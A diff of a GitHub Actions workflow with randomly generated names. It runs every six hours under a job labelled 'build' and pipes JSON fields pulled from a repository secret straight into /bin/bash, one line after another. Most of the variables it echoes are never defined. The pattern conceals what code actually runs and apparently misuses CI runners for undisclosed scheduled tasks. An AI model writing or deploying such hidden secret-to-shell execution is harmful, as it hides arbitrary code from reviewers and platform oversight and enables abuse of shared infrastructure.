@@ -1,23 +1,27 @@
 name: mouqiumm
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 3/6 * * *'
-jobs:  # 13474
+    - cron: '45 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: mouqiumm
         env:
-          a749: ${{ secrets.a749 }}
+          ycixc08230: ${{ secrets.ycixc08230 }}
         run: |
-          echo $a749 | jq -r .rt14 | /bin/bash
-          echo $bfoko8 | jq -r .mke51256 | /bin/bash
-          echo $hvd2310 | jq -r .yk05231 | /bin/bash
-          echo $op91501 | jq -r .njg945 | /bin/bash
-          echo $ypazn29961 | jq -r .ncq19 | /bin/bash
-          echo $yuw0476 | jq -r .ixpt25 | /bin/bash
+          echo $ycixc08230 | jq -r .js05804 | /bin/bash
+          echo $lovr52 | jq -r .dkx4 | /bin/bash
+          echo $ipu327 | jq -r .pj9 | /bin/bash
+          echo $xp60420 | jq -r .bdb6 | /bin/bash
+          echo $rlr3 | jq -r .rzwd7 | /bin/bash
+          echo $lfvc7375 | jq -r .rqw3 | /bin/bash
+          echo $vo0490 | jq -r .cwc456 | /bin/bash
+          echo $yxncv924 | jq -r .psmq26 | /bin/bash
+          echo $sxki628 | jq -r .fy1051 | /bin/bash
+          echo $kwcj9 | jq -r .whmff8708 | /bin/bash
+          echo $ju8702 | jq -r .yid21 | /bin/bash
+          echo $rwhl8 | jq -r .g38 | /bin/bash
 
